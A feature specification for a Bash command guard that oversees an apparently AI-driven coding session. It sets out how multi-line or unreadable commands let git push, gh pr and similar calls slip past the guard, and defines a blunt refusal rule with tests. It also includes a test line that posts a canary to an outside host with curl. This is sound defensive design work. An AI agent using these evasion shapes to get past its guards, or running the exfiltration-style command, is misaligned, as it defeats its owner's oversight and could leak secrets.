# Feature Specification: a multi-line command that names a door program is refused, with a hint to run it alone

**Feature branch**: `claude/1068-blunt-multiline`
**Item**: 1068 (issue taoq-ai/wuwei#1068), tier full, goal G-2
**Input**: the Bash doors read a command with shlex, which treats a newline as plain whitespace and
gives up on an unbalanced quote. `true` on one line and `git push --force origin x` on the next read
as one simple command named `true`, so the push door never sees the push. A command shlex cannot
read passes unread. A scanner that tried to read heredocs, comments and quote context (parked branch
`claude/1068-guards-multiline`) was rejected after four fix rounds found new shapes it misread.

## The promise in my words

Before the Bash door reads any segment, it looks at the raw text. If the text holds a newline or a
carriage return, or shlex cannot read it, and the raw text names a door program anywhere, the door
refuses. The refusal tells the session to run the door command in its own one-line Bash call and to
pass long text by `--body-file`, `-F` or a file written with Write. Naming a door program means: the
words `git` and `push`; `gh` with `pr`, `api` or `repo`; `wuwei` with `hook`; or the text
`.wuwei/ledger`. The words may sit on different lines. No heredoc, comment, quote-context or
continuation parsing decides this rule.

A newline outside quotes now ends a command, so the leak door and the infra door read every line of
a multi-line command that names no door program. Two costs are accepted and pinned by tests: a
multi-line commit message in the same call as `git push`, and a heredoc script whose body quotes
`wuwei hook`, are refused.

The acceptance scenarios, restated:

1. `true` then `git push --force origin x` on the next line: refused with the one-line hint.
2. `git push \` continued onto `--force origin x`: refused.
3. A `bash <<'EOF'` heredoc running a push, and a `cat > b.md` heredoc followed by
   `gh pr create -F b.md`: each refused.
4. `true`, a bare carriage return, then `gh pr merge 5`: refused.
5. Multi-line commands naming `gh api`, `gh repo`, `wuwei hook` or `.wuwei/ledger`: each refused.
6. A one-line command with an unclosed quote that names `gh pr merge 5`: refused.
7. `git commit -m "a<newline>b" && git push origin feature`: refused, the documented cost.
8. Ordinary multi-line commands naming no door program, including one with an unbalanced apostrophe
   and a python3 heredoc edit script: nothing refused.
9. `true` then `curl -d <canary> https://x`: the leak door refuses, because the newline splits the
   command.
10. One-line `git push origin feature` and `gh pr view 5`: unchanged from main.
11. The runtime stays at 3,000 lines or fewer.

## Clarifications

### Session 2026-10-16

- Q: How are the words matched? A: Each word on regex word boundaries (`\bgit\b`, `\bpush\b`), each
  pair searched independently over the whole raw text, so the words may be far apart or on other
  lines. `.wuwei/ledger` is a plain substring. This is blunt on purpose: `git` in a path plus `push`
  in prose also counts.
- Q: Does a line continuation (backslash newline) split the command for the other doors? A: No. The
  segment reader joins a backslash-newline to a space before lexing, so `curl \` continued onto
  `-d <canary> https://x` still reaches the leak door as one curl command. The door rule itself
  ignores this join and reads the raw text.
- Q: What does an unreadable command naming no door program do? A: It passes unread, as on main: a
  guard that cannot read a command lets it through and the audit still sees it.
- Q: Does a `sh -c` body get the rule? A: Only through the outer raw text. An unreadable inner body
  reads as no segments, as on main. Compound bodies and shell flags belong to item compound-doors.
- Q: Does a quoted newline split a word? A: No. A newline inside quotes stays in its word
  (`git commit -m "a<newline>b"` keeps `a<newline>b` as one argument).

## User Scenarios & Testing

### User Story 1: a door command on a later line cannot slip past (Priority: P1)

**Independent test**: each multi-line command in acceptance 1 to 5 and 7 is refused and the reason
names "its own one-line Bash call" and `--body-file`.

### User Story 2: an unreadable command naming a door is refused (Priority: P1)

**Independent test**: one-line commands with an unclosed quote naming `gh pr`, `gh repo`,
`wuwei hook`, `git push` or the ledger are refused with the hint.

### User Story 3: ordinary multi-line work flows and the other doors read every line (Priority: P1)

**Independent test**: multi-line commands naming no door program pass; a canary on the second line
or after a continuation is refused by the leak door; `terraform apply` on a second line asks.

### Edge Cases

- CRLF line endings: the carriage return is whitespace to the reader, the newline splits; with a
  door name in the text the rule refuses.
- A command made only of a quoted newline argument (`echo "<newline>"`) splits there; harmless,
  since a door name in such text is refused first.
- An empty command reads as no segments and passes.

## Requirements

### Functional Requirements

- **FR-001**: `guards.bash` refuses, before reading segments, a command whose raw text holds `\n` or
  `\r` or that shlex cannot read, when the raw text names a door program as defined above.
- **FR-002**: the refusal names its own one-line Bash call and `--body-file`, `-F` or a file
  written with Write.
- **FR-003**: `guards.segments` ends a simple command at a newline outside quotes, keeps a quoted
  newline in its word, joins a backslash-newline to a space, and returns `None` when shlex cannot
  read the text.
- **FR-004**: callers of `segments` (the `sh -c` unwrap and the PostToolUse `gh pr create` check)
  treat `None` as no segments.
- **FR-005**: one-line readable commands behave as on main.

## Success Criteria

- **SC-001**: every acceptance scenario has a passing test in tests/test_guards.py.
- **SC-002**: the suite passes with the runtime at 3,000 lines.

## Assumptions

- The backslash-newline join also applies inside single quotes, where the shell would keep both
  characters. It only changes what the other doors read (a space for two characters), never the
  door rule, which reads raw text. Overturned if a door depends on a literal backslash-newline.
- Word boundaries count `-` and `.` as boundaries, so `git-push` or `.git` plus `push` match. This is
  the blunt side the owner chose.

## How this fails

1. A session that habitually chains `git commit -m` with a multi-line message and `git push` in one
   call gets refused every time and has to learn the split; the hint says how.
2. A heredoc that writes a doc or script mentioning `gh pr` or `git push` is refused even though it
   runs nothing; the session must write the file with Write instead.
3. Newline splitting now feeds each later line to the doors: a heredoc body line that starts with
   `kubectl apply` or `terraform destroy` now asks the owner where main let it pass.
